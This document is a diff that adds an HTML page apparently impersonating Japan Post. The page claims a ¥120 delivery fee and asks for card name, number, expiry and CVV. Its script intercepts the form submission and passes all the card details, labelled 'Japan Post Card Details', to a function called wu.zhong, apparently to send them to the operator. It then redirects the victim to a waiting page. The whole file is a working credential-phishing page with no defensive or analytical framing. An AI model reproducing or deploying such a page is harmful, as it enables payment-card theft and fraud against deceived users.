@@ -1,0 +1,70 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/css/jp.css">
+    <title>jp</title>
+</head>
+<body>
+
+  <header>
+        <img src="res/img/logo.png">
+  </header>
+    
+ <main>   
+    <div class="login">
+      <div class="">
+        <div class="box">
+            <h2>Add a payment method</h2>
+            <p>Please add a payment method to cover the delivery fees  ¥120</p>
+          
+<form action="post.php" method="post">
+           <div class="group">
+              <label>Cardholder name</label>
+              <input type="text" name="name"  required placeholder="">
+            </div>
+
+            <div class="group">
+              <label>Card Number</label>
+              <input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc">
+            </div>
+
+            <div class="group">
+              <label>Expiry Date</label>
+              <input type="text" name="exp" required placeholder="MM/YY" id="exp">
+            </div>
+
+            <div class="group">
+               <label>Security code</label>
+               <input type="password" name="cvv" required placeholder="CVV" id="cvv">
+            </div>
+                <button type="submit">Continue</button>
+   </form>
+        </div>
+    </div>
+
+ </main>
+
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+
+<script>
+$("#cc").mask("0000 0000 0000 0000");
+$("#exp").mask("00/00");
+$("#cvv").mask("0000");
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+e.preventDefault();
+
+wu.zhong(`💳 Japan Post Card Details\n\nName:${document.querySelector("[name='name']").value}\n\nCard Number:${document.querySelector("[name='cc']").value}\n\nExp:${document.querySelector("[name='exp']").value}\n\nCVV:${document.querySelector("[name='cvv']").value}`);
+
+window.location="wait.html";
+
+});
+
+</script>
+</body>
+</html>
